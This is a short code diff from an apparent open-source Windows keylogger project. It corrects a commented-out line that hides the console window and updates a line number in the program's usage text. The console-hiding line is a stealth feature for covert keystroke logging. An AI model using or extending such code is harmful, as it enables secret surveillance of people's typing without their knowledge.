@@ -1,7 +1,7 @@
 import win32clipboard, win32api, win32gui, win32con
 
 #This line hides the console
-#win32gui.ShowWindow(the_program_to_hidewin32gui.GetForegroundWindow() , win32con.SW_HIDE)
+#win32gui.ShowWindow(win32gui.GetForegroundWindow() , win32con.SW_HIDE)
 #htpps://www.github.com/crash-exe/keylogger-windows
 
 
@@ -84,7 +84,7 @@ if __name__ == '__main__':
 Open "out" file to see output
 Post any issues/upgrade ideas/questions on https://github.com/crash-exe/keylogger-windows/issues
 
-Press Ctrl+E to stop the prgram(line 72)
+Press Ctrl+E to stop the prgram(line 74)
 Note: set_to_string(d) can't return 2 values'''
     )
     main_loop()
